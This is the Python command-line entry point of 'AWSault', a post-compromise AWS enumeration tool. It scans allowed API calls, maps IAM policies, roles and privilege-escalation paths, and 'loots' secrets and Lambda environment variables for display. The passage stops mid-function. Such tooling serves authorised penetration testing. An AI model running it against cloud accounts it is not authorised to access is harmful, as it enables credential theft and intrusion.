#!/usr/bin/env python3
"""
AWSault: post-compromise AWS enumeration and analysis.

No subcommands. Flags control what happens:
    (no flags)      surface scan using default credentials
    --godeep        full assault: deep recon + audit + loot
    --show SVC      browse results from the last scan
    --output FILE   export results (with scan: scan+export, alone: export last scan)
"""

import sys
import os
import json
import time
import argparse
import threading

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, MofNCompleteColumn
from rich import box

from . import __version__
from .core import creds
from .core import scanner
from .recon import deep
from .recon import audit
from .recon import loot
from .core import store
from .output import formatters
from .services import get_service_names, get_all_services

con = Console(highlight=False)

BANNER = r"""[bold red]
   ___  _    _ _____             _ _
  / _ \| |  | /  ___|           | | |
 / /_\ \ |  | \ `--.  __ _ _   _| | |_
 |  _  | |/\| |`--. \/ _` | | | | | __|
 | | | \  /\  /\__/ / (_| | |_| | | |_
 \_| |_/\/  \/\____/ \__,_|\__,_|_|\__|
[/bold red][dim]v{ver} | by baeziy (mustfakmalik@gmail.com)[/dim]
"""

_SEV_STYLE = {
    "CRITICAL": "bold white on red", "HIGH": "bold red",
    "MEDIUM": "bold yellow", "LOW": "bold blue", "INFO": "dim",
}


def _banner():
    con.print(BANNER.format(ver=__version__))


def _die(msg):
    con.print(f"[red]{msg}[/red]")
    sys.exit(1)


# ---------------------------------------------------------------------------
# Argument parser
# ---------------------------------------------------------------------------

def _build_parser():
    p = argparse.ArgumentParser(
        prog="awsault",
        description="AWS post-compromise enumeration and analysis.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  awsault                                   surface scan, default credentials
  awsault --profile staging                 surface scan, specific profile
  awsault --godeep                          full assault: deep + audit + loot
  awsault --godeep --all-regions            full assault across every region
  awsault --godeep --output report.html     full assault with HTML export
  awsault --show iam                        list allowed permissions for IAM
  awsault --show iam --detail list_users    view data for a specific permission
  awsault --show iam,s3,lambda              list allowed permissions across services
  awsault --output report.json              export last scan to JSON
  awsault --recon                           view identity, policies, and privesc paths
  awsault --findings                        view security audit findings
  awsault --loot                            view extracted secrets and credentials
  awsault --policy AssumeRole               read a policy or role document live from AWS
  awsault --policy AssumeRole,ReadPolicy    read multiple policies at once
  awsault --policy MyPolicy --version v2    read a specific version of a managed policy
  awsault --all-policies                    list and read all policies on current identity
  awsault --list-services                   show all supported services
""",
    )
    p.add_argument("--profile", default=None, help="AWS profile from ~/.aws/ (omit for default credential chain)")
    p.add_argument("--region", default=None, help="override AWS region")
    p.add_argument("--services", default="all", help="comma-separated service names or 'all' (default: all)")
    p.add_argument("--threads", type=int, default=10, help="concurrent threads (default: 10)")
    p.add_argument("--output", default=None, metavar="FILE", help="export to file (.json, .csv, or .html)")
    p.add_argument("--verbose", action="store_true", help="print API response data in terminal")
    p.add_argument("--godeep", action="store_true", help="full assault: deep recon, security audit, and loot extraction")
    p.add_argument("--show", default=None, metavar="SERVICES", help="list allowed permissions from last scan (e.g. iam,s3 or all)")
    p.add_argument("--detail", default=None, metavar="METHOD", help="view result data for a specific permission (use with --show)")
    p.add_argument("--all-regions", action="store_true", help="sweep every enabled region")
    p.add_argument("--list-services", action="store_true", help="print supported services and exit")
    p.add_argument("--recon", action="store_true", help="view identity recon: policies, roles, and privesc paths from last scan")
    p.add_argument("--findings", action="store_true", help="view security audit findings from last scan")
    p.add_argument("--loot", action="store_true", help="view extracted secrets and credentials from last scan")
    p.add_argument("--policy", default=None, metavar="NAME", help="read policy/role documents live from AWS (comma-separated for multiple)")
    p.add_argument("--version", default=None, metavar="VERSION", help="read a specific version of a managed policy (use with --policy)")
    p.add_argument("--all-policies", action="store_true", help="list and read all policies attached to the current identity")
    return p


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    parser = _build_parser()
    args = parser.parse_args()
    _banner()

    # info command: list services
    if args.list_services:
        _cmd_list_services()
        return

    # --detail requires --show
    if args.detail and args.show is None:
        _die("--detail requires --show. Example: awsault --show iam --detail list_users")

    # --version requires --policy
    if args.version and args.policy is None:
        _die("--version requires --policy. Example: awsault --policy MyPolicy --version v2")

    # --version doesn't work with multiple policies
    if args.version and args.policy and "," in args.policy:
        _die("--version works with a single policy, not multiple. Example: awsault --policy MyPolicy --version v2")

    # policy reader
    if args.policy:
        _cmd_policy(args.policy, args.version, args.profile, args.region)
        return

    # all policies
    if args.all_policies:
        _cmd_all_policies(args.profile, args.region)
        return

    # browse deep data from last scan
    if args.recon or args.findings or args.loot:
        _cmd_browse_deep(args)
        return

    # browse mode: --show
    if args.show is not None:
        if args.output:
            _die("--show and --output cannot be used together. They do different things.")
        _cmd_show(args.show, args.detail)
        return

    # export-only mode: --output without any scan context
    is_scan = args.godeep or args.profile or args.all_regions or (args.services != "all") or args.verbose
    if args.output and not is_scan:
        _cmd_export_only(args.output)
        return

    # scan mode (surface or godeep)
    _cmd_scan(args)


# ---------------------------------------------------------------------------
# Scan
# ---------------------------------------------------------------------------

def _cmd_scan(args):
    """Run a surface scan or full assault depending on --godeep."""
    mode = "godeep" if args.godeep else "surface"

    # load session
    session = creds.load_session(args.profile, args.region)
    if not session:
        if args.profile:
            _die(f"Profile '{args.profile}' not found. Check ~/.aws/credentials.")
        else:
            _die("No valid AWS credentials found. Checked: environment variables, "
                 "~/.aws/credentials (default profile), and instance metadata.")

    region = creds.get_region(session)
    identity = creds.validate(session)
    if not identity:
        _die("Credentials are invalid or expired.")

    con.print(f"  [dim]profile:[/dim]  [bold]{args.profile or '(default chain)'}[/bold]")
    con.print(f"  [dim]region:[/dim]   [bold]{region}[/bold]")
    con.print(f"  [dim]account:[/dim]  [bold]{identity['Account']}[/bold]")
    con.print(f"  [dim]arn:[/dim]      [bold]{identity['Arn']}[/bold]")
    con.print(f"  [dim]mode:[/dim]     [bold]{mode}[/bold]")

    # determine regions
    if args.all_regions:
        regions = creds.get_enabled_regions(session)
        con.print(f"  [dim]regions:[/dim]  [bold]{len(regions)} enabled[/bold]")
    else:
        regions = [region]

    # validate target services
    if args.services.lower() == "all":
        targets = ["all"]
    else:
        targets = [s.strip().lower() for s in args.services.split(",")]
        valid = set(get_service_names())
        bad = [s for s in targets if s not in valid]
        if bad:
            _die(f"Unknown services: {', '.join(bad)}. Run: awsault --list-services")

    con.print()

    # run scan across all regions
    all_quick = {}
    all_deep = {}
    all_findings = []
    all_loot = {}

    for rgn in regions:
        if len(regions) > 1:
            con.print(f"[bold cyan]{'-' * 50}[/bold cyan]")
            con.print(f"[bold cyan]Region: {rgn}[/bold cyan]\n")
            s = creds.load_session(args.profile, rgn)
        else:
            s = session

        # phase 1: surface scan
        quick = _run_surface(s, targets, args.threads)
        for k, v in quick.items():
            rk = k if len(regions) == 1 else f"{k} ({rgn})"
            all_quick[rk] = v

        if mode == "godeep":
            # phase 2: deep enumeration
            con.print("\n[bold]Phase 2:[/bold] Deep enumeration")
            deep_results = _run_deep(s, quick, args.threads)
            for k, v in deep_results.items():
                rk = k if len(regions) == 1 else f"{k} ({rgn})"
                all_deep[rk] = v

            # phase 3: security audit
            con.print("\n[bold]Phase 3:[/bold] Security audit")
            findings = audit.run_audit(quick, deep_results)
            con.print(f"  [bold]{len(findings)}[/bold] findings detected")
            all_findings.extend(findings)

            # phase 4: loot
            con.print("\n[bold]Phase 4:[/bold] Loot extraction")
            loot_results = _run_loot(s, args.threads)
            for k, v in loot_results.items():
                rk = k if len(regions) == 1 else f"{k} ({rgn})"
                existing = all_loot.get(rk, [])
                existing.extend(v)
                all_loot[rk] = existing

    con.print()

    # display results
    _print_summary(all_quick)
    if mode == "godeep":
        _print_findings(all_findings)
        _print_loot_summary(all_loot)
        # phase 5: identity recon display
        recon = all_deep.get("iam_self")
        if not recon:
            for k in all_deep:
                if k.startswith("iam_self"):
                    recon = all_deep[k]
                    break
        _print_recon(recon)
    if args.verbose:
        _print_verbose(all_quick)

    # build the data payload for storage and export
    meta = {"account": identity["Account"], "arn": identity["Arn"],
            "region": ", ".join(regions), "mode": mode}
    payload = _build_payload(meta, all_quick, all_deep, all_findings, all_loot)

    # save to disk for later --show / --output
    store.save_scan(
        quick=all_quick,
        deep=all_deep if all_deep else None,
        findings=all_findings if all_findings else None,
        loot=all_loot if all_loot else None,
        meta=meta,
    )
    con.print(f"  [dim]Results saved to ~/.awsault/last_scan.json[/dim]")

    # export if requested
    if args.output:
        _export(args.output, payload)


def _run_surface(session, targets, threads):
    """Execute the surface scan with a progress bar."""
    total = scanner.count_total_calls(targets)
    lock = threading.Lock()

    con.print("[bold]Phase 1:[/bold] Surface scan" if True else "")  # always phase 1

    with Progress(
        SpinnerColumn("dots"), TextColumn("[bold cyan]{task.description}"),
        BarColumn(bar_width=40, complete_style="green"),
        MofNCompleteColumn(), TextColumn("[dim]{task.fields[cur]}[/dim]"),
        console=con,
    ) as prog:
        task = prog.add_task("Scanning", total=total, cur="...")

        def cb(svc, method, r):
            with lock:
                prog.update(task, advance=1, cur=f"{svc}.{method}")

        t0 = time.time()
        results = scanner.scan(session, targets, workers=threads, on_result=cb)
        elapsed = time.time() - t0

    con.print(f"  Done in [bold]{elapsed:.1f}s[/bold]")
    return results


def _run_deep(session, quick, threads):
    """Execute deep enumeration chains with a progress bar."""
    chain_count = len(deep.CHAINS)
    lock = threading.Lock()

    with Progress(
        SpinnerColumn("dots"), TextColumn("[bold cyan]{task.description}"),
        BarColumn(bar_width=40, complete_style="green"),
        MofNCompleteColumn(), TextColumn("[dim]{task.fields[cur]}[/dim]"),
        console=con,
    ) as prog:
        task = prog.add_task("Chaining", total=chain_count, cur="...")

        def cb(name, count):
            with lock:
                prog.update(task, advance=1, cur=f"{name} ({count})")

        t0 = time.time()
        results = deep.run_deep(session, quick, workers=threads, on_result=cb)
        elapsed = time.time() - t0

    con.print(f"  Done in [bold]{elapsed:.1f}s[/bold]")
    return results


def _run_loot(session, threads):
    """Execute loot extractors with a progress bar."""
    src_count = len(loot.LOOT_SOURCES)
    lock = threading.Lock()

    with Progress(
        SpinnerColumn("dots"), TextColumn("[bold cyan]{task.description}"),
        BarColumn(bar_width=40, complete_style="green"),
        MofNCompleteColumn(), TextColumn("[dim]{task.fields[cur]}[/dim]"),
        console=con,
    ) as prog:
        task = prog.add_task("Looting", total=src_count, cur="...")

        def cb(name, count):
            with lock:
                prog.update(task, advance=1, cur=f"{name} ({count})")

        t0 = time.time()
        results = loot.run_loot(session, workers=threads, on_result=cb)
        elapsed = time.time() - t0

    con.print(f"  Done in [bold]{elapsed:.1f}s[/bold]")
    return results


# ---------------------------------------------------------------------------
# Browse deep data (--recon, --findings, --loot)
# ---------------------------------------------------------------------------

def _cmd_browse_deep(args):
    """Browse deep scan data from the last saved scan."""
    data = store.load_scan()
    if not data:
        _die("No saved scan found. Run a scan with --godeep first.")

    shown = False

    if args.recon:
        recon = data.get("recon")
        if not recon:
            # try to find recon in deep data (older scan format)
            deep_data = data.get("deep", {})
            for k, v in deep_data.items():
                if k.startswith("iam_self") and v:
                    recon = v
                    break
        if recon:
            _print_recon(recon)
            shown = True
        else:
            con.print("[dim]No recon data in last scan. Run with --godeep to collect identity recon.[/dim]\n")

    if args.findings:
        raw_findings = data.get("findings", [])
        if raw_findings:
            # rebuild Finding objects from dicts
            findings = [audit.Finding(**f) for f in raw_findings]
            _print_findings(findings)
            shown = True
        else:
            con.print("[dim]No security findings in last scan. Run with --godeep to run the audit.[/dim]\n")

    if args.loot:
        loot_data = data.get("loot", {})
        if loot_data:
            _print_loot_summary(loot_data)
            # show actual loot contents
            for source, items in sorted(loot_data.items()):
                if not items:
                    continue
                con.print(f"\n[bold cyan]{'-' * 50}[/bold cyan]")
                con.print(f"[bold cyan]{source.upper()}[/bold cyan]  "
                          f"[dim]({len(items)} items)[/dim]\n")
                for item in items:
                    name = item.get("Name") or item.get("FunctionName") or item.get("InstanceId") or "?"
                    con.print(f"  [green]■[/green] [bold]{name}[/bold]")
                    readable = item.get("Readable")
                    if readable is True and item.get("Value"):
                        val = item["Value"]
                        if isinstance(val, str) and len(val) > 500:
                            val = val[:500] + "..."
                        con.print(f"    [dim]{val}[/dim]")
                    elif readable is True and item.get("Variables"):
                        for vk, vv in item["Variables"].items():
                            con.print(f"    [dim]{vk} = {vv}[/dim]")
                    elif readable is False:
                        reason = item.get("Error", "access denied")
                        con.print(f"    [red]Not readable:[/red] [dim]{reason}[/dim]")
                    # show any extra metadata
                    for meta_key in ("Arn", "Region", "Type"):
                        if item.get(meta_key):
                            con.print(f"    [dim]{meta_key}: {item[meta_key]}[/dim]")
            con.print()
            shown = True
        else:
            con.print("[dim]No loot data in last scan. Run with --godeep to extract loot.[/dim]\n")

    if not shown:
        con.print("[dim]No deep data available. Run: awsault --godeep[/dim]\n")


# ---------------------------------------------------------------------------
# Policy reader (--policy)
# ---------------------------------------------------------------------------

def _load_recon():
    """Load recon data from the saved scan."""
    data = store.load_scan()
    if not data:
        return None
    recon = data.get("recon")
    if not recon:
        deep_data = data.get("deep", {})
        for k, v in deep_data.items():
            if k.startswith("iam_self") and v:
                recon = v
                break
    return recon


def _init_policy_session(profile, region):
    """Set up an AWS session and return (iam_client, principal_type, principal_name)."""
    session = creds.load_session(profile, region)
    if not session:
        _die("Cannot load AWS credentials. Use --profile if needed.")

    identity = creds.validate(session)
    if not identity:
        _die("Invalid AWS credentials. Cannot connect to AWS.")

    iam = session.client("iam")

    arn = identity["Arn"]
    principal_type = None
    principal_name = None
    if ":user/" in arn:
        principal_type = "user"
        principal_name = arn.rsplit("/", 1)[-1]
    elif ":role/" in arn or ":assumed-role/" in arn:
        principal_type = "role"
        principal_name = arn.rsplit("/", 1)[-1]

    return iam, principal_type, principal_name


def _cmd_policy(name, version, profile, region):
    """Read one or more policy/role documents live from AWS."""
    recon = _load_recon()
    iam, principal_type, principal_name = _init_policy_session(profile, region)

    names = [n.strip() for n in name.split(",") if n.strip()]

    for n in names:
        found_as = _identify_name(n, recon, iam, principal_type, principal_name)

        if found_as == "inline_policy":
            _read_inline_policy(iam, n, principal_type, principal_name)
        elif found_as == "managed_policy":
            _read_managed_policy(iam, n, version, recon)
        elif found_as == "role":
            _read_role(iam, n)
        else:
            con.print(f"\n[red]'{n}' not found as a policy or role.[/red]")
            con.print(f"[dim]Searched: inline policies on {principal_type}/{principal_name}, "
                      f"managed policies, and IAM roles.[/dim]\n")


def _cmd_all_policies(profile, region):
    """List and read all policies attached to the current identity."""
    recon = _load_recon()
    iam, principal_type, principal_name = _init_policy_session(profile, region)

    con.print(f"\n[bold cyan]{'-' * 50}[/bold cyan]")
    con.print(f"[bold cyan]ALL POLICIES FOR:[/bold cyan] [bold]{principal_type}/{principal_name}[/bold]\n")

    # collect inline policies
    inline_names = []
    try:
        if principal_type == "user":
            resp = iam.list_user_policies(UserName=principal_name)
        else:
            resp = iam.list_role_policies(RoleName=principal_name)
        inline_names = resp.get("PolicyNames", [])
    except Exception as e:
        err = getattr(e, "response", {}).get("Error", {}).get("Code", str(e))
        action = "iam:ListUserPolicies" if principal_type == "user" else "iam:ListRolePolicies"
        con.print(f"  [yellow]Inline policies:[/yellow] [red]Access denied[/red] "
                  f"[dim]-- requires {action} ({err})[/dim]\n")

    # collect managed policies
    managed = []
    try:
        if principal_type == "user":
            resp = iam.list_attached_user_policies(UserName=principal_name)
        else:
            resp = iam.list_attached_role_policies(RoleName=principal_name)
        managed = resp.get("AttachedPolicies", [])
    except Exception as e:
        err = getattr(e, "response", {}).get("Error", {}).get("Code", str(e))
        action = "iam:ListAttachedUserPolicies" if principal_type == "user" else "iam:ListAttachedRolePolicies"
        con.print(f"  [yellow]Managed policies:[/yellow] [red]Access denied[/red] "
                  f"[dim]-- requires {action} ({err})[/dim]\n")

    total = len(inline_names) + len(managed)
    if total == 0 and not inline_names and not managed:
        con.print(f"  [dim]No policies found (or insufficient permissions to list them).[/dim]\n")
        return

    con.print(f"  [bold]{total} policies found[/bold] "
              f"[dim]({len(inline_names)} inline, {len(managed)} managed)[/dim]\n")

    # display each inline policy
    for pname in inline_names:
        _read_inline_policy(iam, pname, principal_type, principal_name)

    # display each managed policy
    for mp in managed:
        _read_managed_policy(iam, mp["PolicyName"], None, recon)


def _identify_name(name, recon, iam, principal_type, principal_name):
    """Figure out what a name refers to: inline_policy, managed_policy, or role."""

    # 1. check saved recon data first
    if recon:
        for pol in recon.get("Policies", []):
            if pol["Name"] == name:
                if pol["Type"] == "inline":
                    return "inline_policy"
                else:
                    return "managed_policy"
        for role in recon.get("AssumableRoles", []):
            if role.get("RoleName") == name:
                return "role"

    # 2. no scan data or not found there — try live API calls
    # try inline policy on current user/role
    try:
        if principal_type == "user":
            iam.get_user_policy(UserName=principal_name, PolicyName=name)
            return "inline_policy"
        elif principal_type == "role":
            iam.get_role_policy(RoleName=principal_name, PolicyName=name)
            return "inline_policy"
    except iam.exceptions.NoSuchEntityException:
        pass
    except Exception:
        pass

    # try as a role name
    try:
        iam.get_role(RoleName=name)
        return "role"
    except iam.exceptions.NoSuchEntityException:
        pass
    except Exception:
        pass

    # try as a managed policy (search by name)
    arn = _find_managed_policy_arn(iam, name)
    if arn:
        return "managed_policy"

    return None


def _find_managed_policy_arn(iam, name):
    """Find the ARN of a managed policy by name, checking local and AWS policies."""
    try:
        # try customer managed policies
        paginator = iam.get_paginator("list_policies")
        for page in paginator.paginate(Scope="Local"):
            for pol in page.get("Policies", []):
                if pol["PolicyName"] == name:
                    return pol["Arn"]
    except Exception:
        pass

    try:
        # try AWS managed policies
        paginator = iam.get_paginator("list_policies")
        for page in paginator.paginate(Scope="AWS"):
            for pol in page.get("Policies", []):
                if pol["PolicyName"] == name:
                    return pol["Arn"]
    except Exception:
        pass

    return None


def _read_inline_policy(iam, policy_name, principal_type, principal_name):
    """Fetch and display an inline policy document."""
    con.print(f"\n[bold cyan]{'-' * 50}[/bold cyan]")
    con.print(f"[bold cyan]POLICY:[/bold cyan] [bold]{policy_name}[/bold]\n")

    try:
        if principal_type == "user":
            resp = iam.get_user_policy(UserName=principal_name, PolicyName=policy_name)
        elif principal_type == "role":
            resp = iam.get_role_policy(RoleName=principal_name, PolicyName=policy_name)
        else:
            _die(f"Unknown principal type: {principal_type}")
            return

        doc = resp.get("PolicyDocument", {})
        con.print(f"  [dim]Type:[/dim]        [yellow]inline[/yellow]")
        con.print(f"  [dim]Attached to:[/dim] {principal_type}/{principal_name}\n")
        con.print(f"[dim]{json.dumps(doc, indent=2)}[/dim]")
    except Exception as e:
        err = getattr(e, "response", {}).get("Error", {}).get("Code", str(e))
        con.print(f"  [dim]Type:[/dim]        [yellow]inline[/yellow]")
        con.print(f"  [dim]Attached to:[/dim] {principal_type}/{principal_name}\n")
        con.print(f"  [red]Access denied[/red] [dim]-- your credentials don't have "
                  f"iam:Get{principal_type.title()}Policy permission ({err})[/dim]")

    con.print()


def _read_managed_policy(iam, policy_name, version, recon):
    """Fetch and display a managed policy document with version info."""
    con.print(f"\n[bold cyan]{'-' * 50}[/bold cyan]")
    con.print(f"[bold cyan]POLICY:[/bold cyan] [bold]{policy_name}[/bold]\n")

    # find the ARN
    policy_arn = None

    # check recon data first
    if recon:
        for pol in recon.get("Policies", []):
            if pol["Name"] == policy_name and pol.get("Arn"):
                policy_arn = pol["Arn"]
                break

    if not policy_arn:
        policy_arn = _find_managed_policy_arn(iam, policy_name)

    if not policy_arn:
        con.print(f"  [red]Could not find managed policy '{policy_name}'.[/red]\n")
        return

    # get policy metadata
    try:
        pol_resp = iam.get_policy(PolicyArn=policy_arn)
        pol_meta = pol_resp["Policy"]
        default_version = pol_meta.get("DefaultVersionId", "v1")
        is_aws = policy_arn.startswith("arn:aws:iam::aws:policy/")
        pol_type = "AWS managed" if is_aws else "customer managed"

        con.print(f"  [dim]Type:[/dim]        [cyan]{pol_type}[/cyan]")
        con.print(f"  [dim]ARN:[/dim]         {policy_arn}")

        # find who it's attached to from recon
        attached_to = None
        if recon:
            for p in recon.get("Policies", []):
                if p["Name"] == policy_name:
                    attached_to = p.get("AttachedTo")
                    break
        if attached_to:
            con.print(f"  [dim]Attached to:[/dim] {attached_to}")

    except Exception as e:
        err = getattr(e, "response", {}).get("Error", {}).get("Code", str(e))
        con.print(f"  [dim]ARN:[/dim]         {policy_arn}")
        con.print(f"  [red]Access denied[/red] [dim]-- your credentials don't have "
                  f"iam:GetPolicy permission ({err})[/dim]\n")
        return

    # list all versions
    all_versions = []
    try:
        ver_resp = iam.list_policy_versions(PolicyArn=policy_arn)
        all_versions = ver_resp.get("Versions", [])
        version_ids = [v["VersionId"] for v in all_versions]
        version_display = []
        for vid in sorted(version_ids):
            if vid == default_version:
                version_display.append(f"{vid} (default)")
            else:
                version_display.append(vid)

        con.print(f"  [dim]Version:[/dim]     {default_version} (default)")
        if len(version_ids) > 1:
            con.print(f"  [dim]Available:[/dim]   {', '.join(version_display)}")
    except Exception:
        con.print(f"  [dim]Version:[/dim]     {default_version} (default)")
        con.print(f"  [dim]Available:[/dim]   [yellow]cannot list versions (iam:ListPolicyVersions denied)[/yellow]")

    # fetch the requested version (or default)
    target_version = version if version else default_version
    con.print()

    try:
        ver_resp = iam.get_policy_version(PolicyArn=policy_arn, VersionId=target_version)
        doc = ver_resp["PolicyVersion"]["Document"]
        if target_version != default_version:
            con.print(f"  [bold yellow]Showing version {target_version}[/bold yellow] "
                      f"[dim](default is {default_version})[/dim]\n")
        con.print(f"[dim]{json.dumps(doc, indent=2)}[/dim]")
    except Exception as e:
        err = getattr(e, "response", {}).get("Error", {}).get("Code", str(e))
        con.print(f"  [red]Access denied[/red] [dim]-- your credentials don't have "
                  f"iam:GetPolicyVersion permission ({err})[/dim]")

    # tip for other versions
    if len(all_versions) > 1 and not version:
        other = [v["VersionId"] for v in all_versions if v["VersionId"] != default_version]
        if other:
            con.print(f"\n  [dim]Tip: awsault --policy {policy_name} --version {other[0]}[/dim]")

    con.print()


def _read_role(iam, role_name):
    """Fetch and display a role's trust policy and attached policies."""
    con.print(f"\n[bold cyan]{'-' * 50}[/bold cyan]")
    con.print(f"[bold cyan]ROLE:[/bold cyan] [bold]{role_name}[/bold]\n")

    # get role info and trust policy
    role_arn = None
    try:
        role_resp = iam.get_role(RoleName=role_name)
        role_data = role_resp["Role"]
        role_arn = role_data.get("Arn", "")
        trust_doc = role_data.get("AssumeRolePolicyDocument", {})
        desc = role_data.get("Description", "")

        con.print(f"  [dim]ARN:[/dim]  {role_arn}")
        if desc:
            con.print(f"  [dim]Desc:[/dim] {desc}")

        con.print(f"\n  [bold green]Trust Policy[/bold green] [dim](who can assume this role):[/dim]\n")
        con.print(f"[dim]{json.dumps(trust_doc, indent=2)}[/dim]")
    except Exception as e:
        err = getattr(e, "response", {}).get("Error", {}).get("Code", str(e))
        con.print(f"  [bold green]Trust Policy:[/bold green]")
        con.print(f"    [red]Access denied[/red] [dim]-- your credentials don't have "
                  f"iam:GetRole permission ({err})[/dim]")

    # get inline policies
    con.print(f"\n  [bold green]Attached Policies:[/bold green]\n")

    inline_names = []
    try:
        resp = iam.list_role_policies(RoleName=role_name)
        inline_names = resp.get("PolicyNames", [])
    except Exception as e:
        err = getattr(e, "response", {}).get("Error", {}).get("Code", str(e))
        con.print(f"    [yellow]Inline policies:[/yellow] [red]Access denied[/red] "
                  f"[dim]-- requires iam:ListRolePolicies ({err})[/dim]")

    for pname in inline_names:
        try:
            resp = iam.get_role_policy(RoleName=role_name, PolicyName=pname)
            doc = resp.get("PolicyDocument", {})
            con.print(f"    [yellow]>[/yellow] [bold]{pname}[/bold] [dim](inline)[/dim]\n")
            con.print(f"[dim]{json.dumps(doc, indent=2)}[/dim]\n")
        except Exception as e:
            err = getattr(e, "response", {}).get("Error", {}).get("Code", str(e))
            con.print(f"    [yellow]>[/yellow] [bold]{pname}[/bold] [dim](inline)[/dim]")
            con.print(f"      [red]Access denied[/red] [dim]-- requires iam:GetRolePolicy ({err})[/dim]\n")

    # get managed policies
    managed = []
    try:
        resp = iam.list_attached_role_policies(RoleName=role_name)
        managed = resp.get("AttachedPolicies", [])
    except Exception as e:
        err = getattr(e, "response", {}).get("Error", {}).get("Code", str(e))
        con.print(f"    [yellow]Managed policies:[/yellow] [red]Access denied[/red] "
                  f"[dim]-- requires iam:ListAttachedRolePolicies ({err})[/dim]")

    for mp in managed:
        mp_name = mp["PolicyName"]
        mp_arn = mp["PolicyArn"]
        is_aws = mp_arn.startswith("arn:aws:iam::aws:policy/")
        label = "AWS managed" if is_aws else "customer managed"

        try:
            pol_resp = iam.get_policy(PolicyArn=mp_arn)
            default_ver = pol_resp["Policy"].get("DefaultVersionId", "v1")
            ver_resp = iam.get_policy_version(PolicyArn=mp_arn, VersionId=default_ver)
            doc = ver_resp["PolicyVersion"]["Document"]
            con.print(f"    [yellow]>[/yellow] [bold]{mp_name}[/bold] [dim]({label}, {default_ver})[/dim]\n")
            con.print(f"[dim]{json.dumps(doc, indent=2)}[/dim]\n")
        except Exception as e:
            err = getattr(e, "response", {}).get("Error", {}).get("Code", str(e))
            con.print(f"    [yellow]>[/yellow] [bold]{mp_name}[/bold] [dim]({label})[/dim]")
            con.print(f"      [red]Access denied[/red] [dim]-- requires iam:GetPolicy + "
                      f"iam:GetPolicyVersion ({err})[/dim]\n")

    if not inline_names and not managed:
        con.print(f"    [dim]No policies found (or insufficient permissions to list them)[/dim]")

    con.print()


# ---------------------------------------------------------------------------
# Show (browse last scan)
# ---------------------------------------------------------------------------

def _cmd_show(service_arg, detail_method=None):
    """
    --show lists allowed permissions per service.
    --show SVC --detail METHOD shows the actual result data for that method.
    """
    data = store.load_scan()
    if not data:
        _die("No saved scan found. Run a scan first.")

    services = data.get("services", {})
    if not services:
        _die("Last scan contains no service data.")

    if service_arg.lower() == "all":
        targets = sorted(services.keys())
    else:
        targets = [s.strip().lower() for s in service_arg.split(",")]
        missing = [t for t in targets if t not in services]
        if missing:
            available = ", ".join(sorted(services.keys()))
            _die(f"Services not in last scan: {', '.join(missing)}\nAvailable: {available}")

    # --detail: show full data for a specific permission
    if detail_method:
        if len(targets) > 1:
            _die("--detail works with a single service. Example: awsault --show iam --detail list_users")

        svc_name = targets[0]
        svc = services[svc_name]
        found = None
        for call in svc.get("calls", []):
            if call["method"] == detail_method:
                found = call
                break

        if not found:
            ok_methods = [c["method"] for c in svc.get("calls", []) if c["status"] == "ok"]
            _die(f"'{detail_method}' not found in {svc_name}.\n"
                 f"Allowed permissions: {', '.join(ok_methods) if ok_methods else 'none'}")

        if found["status"] != "ok":
            _die(f"'{detail_method}' was {found['status']} — no data available.")

        con.print(f"\n[bold cyan]{svc_name.upper()}.{detail_method}[/bold cyan] "
                  f"[dim]({found.get('count', 0)} items)[/dim]\n")
        if found.get("data"):
            formatted = json.dumps(found["data"], indent=2)
            con.print(f"[dim]{formatted}[/dim]")
        else:
            con.print("[dim]No data returned.[/dim]")
        con.print()
        return

    # default --show: list allowed permissions only
    for svc_name in targets:
        svc = services[svc_name]
        sm = svc.get("summary", {})
        ok_count = sm.get("ok", 0)
        total = sm.get("total", 0)

        con.print(f"\n[bold cyan]{'-' * 50}[/bold cyan]")
        if ok_count == total:
            badge = "[bold green]FULL ACCESS[/bold green]"
        elif ok_count > 0:
            badge = "[bold yellow]PARTIAL[/bold yellow]"
        else:
            badge = "[dim red]NO ACCESS[/dim red]"
        con.print(f"[bold cyan]{svc_name.upper()}[/bold cyan]  {badge}  "
                  f"[dim]{ok_count}/{total} allowed[/dim]")

        ok_calls = [c for c in svc.get("calls", []) if c["status"] == "ok"]
        denied_calls = [c for c in svc.get("calls", []) if c["status"] == "denied"]

        if ok_calls:
            con.print(f"\n  [green]Allowed:[/green]")
            for call in ok_calls:
                con.print(f"    [green]✓[/green] {call['method']} [dim]({call.get('count', 0)} items)[/dim]")

        if denied_calls:
            con.print(f"\n  [red]Denied:[/red]")
            for call in denied_calls:
                con.print(f"    [red]✗[/red] {call['method']}")

        error_calls = [c for c in svc.get("calls", []) if c["status"] not in ("ok", "denied")]
        if error_calls:
            con.print(f"\n  [yellow]Errors:[/yellow]")
            for call in error_calls:
                con.print(f"    [yellow]![/yellow] {call['method']} [dim]— {call.get('error', '')}[/dim]")

    if len(targets) == 1 and ok_calls:
        con.print(f"\n[dim]Tip: awsault --show {targets[0]} --detail <method> to view result data[/dim]")
    con.print()


# ---------------------------------------------------------------------------
# Export only (no scan)
# ---------------------------------------------------------------------------

def _cmd_export_only(filepath):
    """Export the last scan to a file without re-scanning."""
    data = store.load_scan()
    if not data:
        _die("No saved scan found. Run a scan first.")
    _export(filepath, data)


# ---------------------------------------------------------------------------
# List services
# ---------------------------------------------------------------------------

def _cmd_list_services():
    all_svc = get_all_services()
    t = Table(title="Supported Services", box=box.ROUNDED,
              border_style="bright_blue", header_style="bold cyan")
    t.add_column("Service", style="bold white", min_width=20)
    t.add_column("Calls", style="yellow", justify="right", width=6)
    t.add_column("Methods", style="dim")

    total = 0
    for name in get_service_names():
        calls = all_svc[name]["calls"]
        total += len(calls)
        methods = ", ".join(c["method"] for c in calls[:4])
        if len(calls) > 4:
            methods += f" (+{len(calls) - 4})"
        t.add_row(name, str(len(calls)), methods)

    con.print(t)
    con.print(f"\n  [bold cyan]{len(all_svc)}[/bold cyan] services, [bold cyan]{total}[/bold cyan] API calls\n")


# ---------------------------------------------------------------------------
# Display helpers
# ---------------------------------------------------------------------------

def _print_summary(results):
    t = Table(title="Service Enumeration", box=box.ROUNDED,
              border_style="bright_blue", header_style="bold cyan")
    t.add_column("Service", style="bold", min_width=20)
    t.add_column("Total", justify="right", width=6)
    t.add_column("OK", justify="right", width=6)
